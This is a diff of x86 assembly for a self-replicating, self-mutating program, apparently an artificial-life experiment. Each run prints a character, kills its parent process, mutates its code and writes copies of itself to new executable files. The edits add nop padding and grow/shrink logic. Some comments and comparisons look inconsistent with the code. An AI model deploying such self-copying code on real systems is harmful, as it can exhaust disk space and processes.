@@ -57,10 +57,17 @@ program:        mov     eax, 4                  ; 5 = sys_write
                 mov     edx, 1                  ; edx should contain how many characters to print
                 int     0x80                    ; sys_write(1, 'A', 1)
                 add     esp, 4
-                ret
 
 programend      equ     $
+
+    times 100   nop
+
+programrend     equ     $
+
+                ret
+
 programsize     equ     programend - programstart
+programrsize    equ     programrend - programstart
 
 do_inc_fname:   inc     byte [ebx]              ; Increment the filename
                 ret
@@ -124,11 +131,15 @@ left_shift:     mov     ebx, eax                ; Copy delete offset to ebx
                 jng     left_shift              ; if eax not greater than the filsize then repeat
                 ret
 
-shrink:         mov     eax, 1                  ; Delete offset, between 1 and "current programsize"
-                add     eax, programstart       ; add programstart offset to delete offset to find the true location
+shrink:         mov     eax, 1                  ; 1 = delete offset
+                add     eax, programstart       ; add programstart offset to delete offset to find the true address
                 call    left_shift              ; left shift the whole program starting from the delete offset
-                dec     esi                     ; decrement the programsize
-                dec     edi                     ; decrement the filesize
+                ret
+
+shrink_if:      mov     eax, 1                  ; 1 = delete size
+                cmp     eax, programend - 1     ; compare delete size to programsize
+                jl      shrink                  ; shrink if delete size is less than programsize
+                call    grow                    ; otherwise grow
                 ret
 
 right_shift:    mov     ecx, [ebx]              ; Move the byte pointed by ebx into ecx (right shift - first half)
@@ -176,7 +187,7 @@ replicate:      call    mutate                  ; mutate
                 mov     ecx, 65                 ; 65 = O_WRONLY | O_CREAT
                 mov     edx, 777q               ; file mode (octal)
                 int     0x80                    ; sys_open(fname, 65, 777)
-                lea     edx, [edi]              ; load effective address of filesize
+                lea     edx, [filesize]         ; load effective address of filesize
                 xchg    eax, ebx                ; move the file descriptor in eax to ebx
                 xchg    eax, ecx                ; swap eax and ecx
                 mov     cl, 0                   ; point out to the beginning of the program by removing first 8 bits
@@ -192,9 +203,7 @@ exit:           mov     bl, 0                   ; 0 = Exit code
                 mov     al, 1                   ; 1 = sys_exit
                 int     0x80                    ; sys_exit(0)
 
-_start:         mov     esi, programsize        ; Move programsize into esi (only increment or decrement this)
-                mov     edi, filesize           ; move filesize into edi (only increment or decrement this)
-                call    program
+_start:         call    program
                 call    kill_parent
                 call    replicate               ; replicate subroutine must not fail!
                 call    exit
